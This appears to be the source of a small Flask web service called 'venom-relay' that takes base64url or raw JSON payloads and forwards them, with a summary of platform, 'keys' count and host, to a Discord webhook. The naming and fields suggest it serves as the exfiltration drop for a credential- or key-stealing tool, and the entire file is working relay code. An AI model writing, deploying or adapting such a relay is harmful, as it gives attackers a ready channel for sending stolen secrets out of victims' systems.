# venom-relay — Render Web Service (Python / Flask)
# env vars : DISCORD_WEBHOOK (obligatoire), SECRET (optionnel)
# route    : GET /?data=<base64url>&key=<secret>  |  POST /  (json brut)

import os
import base64
import json
import time

from flask import Flask, request, Response
import requests

app = Flask(__name__)

WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
SECRET  = os.environ.get("SECRET", "")

if not WEBHOOK:
    raise SystemExit("DISCORD_WEBHOOK missing")

DONE_PAGE = (
    "<!doctype html><meta charset=utf-8><title>ok</title>"
    "<body style='background:#050a06;color:#4ade80;font:14px system-ui;"
    "display:grid;place-items:center;height:100vh;margin:0'>done</body>"
)


def decode_b64url(s: str) -> str:
    b64 = s.replace("-", "+").replace("_", "/")
    b64 += "=" * (-len(b64) % 4)
    return base64.b64decode(b64).decode("utf-8")


def forward(parsed: dict, payload: str) -> Response:
    summary = (
        f"**Venom** — platform: `{parsed.get('platform', '?')}`"
        f" | keys: `{len(parsed.get('keys', []) or [])}`"
        f" | host: `{parsed.get('host', '?')}`"
    )

    files = {
        "files[0]": (
            f"venom-{int(time.time()*1000)}.json",
            payload.encode("utf-8"),
            "application/json",
        )
    }
    data = {"payload_json": json.dumps({"content": summary})}

    try:
        r = requests.post(WEBHOOK, data=data, files=files, timeout=15)
    except requests.RequestException as e:
        return Response(f"fetch failed: {e}", status=500)

    if not r.ok:
        return Response(
            f"discord {r.status_code} {r.text[:300]}",
            status=502,
            mimetype="text/plain",
        )

    return Response(DONE_PAGE, mimetype="text/html")


@app.get("/")
def root():
    raw = request.args.get("data")
    if not raw:
        return Response("ok", mimetype="text/plain")

    if SECRET and request.args.get("key") != SECRET:
        return Response("forbidden", status=403, mimetype="text/plain")

    try:
        payload = decode_b64url(raw)
        parsed = json.loads(payload)
    except Exception as e:
        return Response(f"bad payload: {e}", status=400, mimetype="text/plain")

    return forward(parsed, payload)


@app.post("/")
def post_root():
    if SECRET and request.args.get("key") != SECRET:
        return Response("forbidden", status=403, mimetype="text/plain")

    payload = request.get_data(as_text=True) or ""
    try:
        parsed = json.loads(payload)
    except Exception:
        return Response("bad json", status=400, mimetype="text/plain")

    return forward(parsed, payload)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
